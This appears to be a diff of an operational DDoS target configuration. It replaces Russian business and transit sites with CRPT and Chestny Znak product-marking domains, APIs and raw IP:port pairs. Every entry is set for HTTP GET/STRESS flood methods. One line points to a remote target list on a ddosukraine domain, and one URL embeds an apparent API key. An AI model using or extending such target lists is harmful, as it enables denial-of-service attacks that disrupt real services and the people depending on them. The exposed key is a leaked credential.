@@ -1,17 +1,21 @@
 #zhnec
 
-https://e-kontur.ru/ https://elba.kontur.ru/AccessControl/Login https://auth.kontur.ru/ https://install.kontur.ru/ https://kontur.ru/ --http-methods GET STRESS
-https://api.kontur.ru/csi/support/v1/public/integrations/zakupki https://zakupki.kontur.ru/ https://pf.kontur.ru/ https://help.kontur.ru/ --http-methods GET STRESS
-https://focus.kontur.ru/ https://focus-api.kontur.ru/ https://ff.kontur.ru/ https://elbank.kontur.ru/ https://www.b-kontur.ru/ --http-methods GET STRESS
-https://developer.kontur.ru/ https://evrika.kontur.ru/ https://cabinet.kontur.ru/ https://ca.kontur.ru/ https://www.kontur-extern.ru/ --http-methods GET STRESS
+https://www.crpt.ru https://markirovka.crpt.ru/login-kep https://milk.crpt.ru/ https://ismp.crpt.ru https://edo-gismt.crpt.ru/ --http-methods GET STRESS
+https://suzgrid.crpt.ru/login http://suz2.crpt.ru http://api.mdlp.crpt.ru http://kb.crpt.ru --http-methods GET STRESS
+http://nrz.api.sb.mdlp.crpt.ru http://api.sb.mdlp.crpt.ru https://апи.национальный-каталог.рф/ --http-methods GET STRESS
+tcp://82.202.190.212:80 tcp://82.202.190.212:443 tcp://91.230.251.101:80 tcp://91.230.251.101:443 tcp://91.230.251.71:80 tcp://91.230.251.71:443 
+tcp://91.230.251.77:80 tcp://91.230.251.77:443 tcp://91.230.251.99:80 tcp://91.230.251.99:443 tcp://91.230.251.70:80 tcp://91.230.251.70:443 
+tcp://78.142.221.17:80 tcp://78.142.221.17:443 tcp://91.230.251.81:80 tcp://91.230.251.81:443 tcp://91.230.251.82:80 tcp://91.230.251.82:443 
+tcp://91.230.251.78:80 tcp://91.230.251.78:443 tcp://91.230.251.79:80 tcp://91.230.251.79:443
 
 #gaidamaky
-http://iktport.ru http://dev-iktport.ru http://hotel.iktport.ru http://booking.iktport.ru --http-methods STRESS
--c http://goals.ddosukraine.com.ua/haydamaky/targets_tcp.txt --http-methods POST STRESS
+https://markirovka.crpt.ru/login-kep https://milk.crpt.ru/ https://ismp.crpt.ru https://suzgrid.crpt.ru/login http://api.mdlp.crpt.ru --http-methods STRESS
+http://kb.crpt.ru http://suz2.crpt.ru http://nrz.api.sb.mdlp.crpt.ru http://api.mdlp.crpt.ru http://api.sb.mdlp.crpt.ru --http-methods STRESS
+#-c http://goals.ddosukraine.com.ua/haydamaky/targets_tcp.txt --http-methods POST STRESS
 
 #ddos separiv
 
-http://nnoblsud.ru https://mosmetro.ru https://job.mosmetro.ru https://mis.mosmetro.ru/login.php https://app-bucket.mosmetro.ru --http-methods GET STRESS
-https://shop.mosmetro.ru https://elba.kontur.ru/AccessControl/Login https://auth.kontur.ru/ --http-methods GET STRESS  
-https://focus-api.kontur.ru/ https://developer.kontur.ru/ https://cabinet.kontur.ru/ https://www.kontur-extern.ru/ --http-methods GET STRESS 
-https://evrika.kontur.ru https://api.kontur.ru/csi/support/v1/public/integrations/zakupki https://edi-api.kontur.ru --http-methods GET STRESS
+https://www.crpt.ru https://markirovka.crpt.ru/login-kep https://milk.crpt.ru/ https://ismp.crpt.ru https://edo-gismt.crpt.ru/ --http-methods GET STRESS
+https://suzgrid.crpt.ru/login http://api.mdlp.crpt.ru http://kb.crpt.ru http://suz2.crpt.ru http://nrz.api.sb.mdlp.crpt.ru http://api.mdlp.crpt.ru --http-methods GET STRESS
+http://api.sb.mdlp.crpt.ru https://честныйзнак.рф/potrebitelyam/ https://апи.национальный-каталог.рф/ --http-methods GET STRESS
+https://xn--80aqu.xn----7sbabas4ajkhfocclk9d3cvfsa.xn--p1ai/v3/feed-product?apikey=6A9769C235F432 tcp://91.230.251.101:443 --http-methods GET STRESS
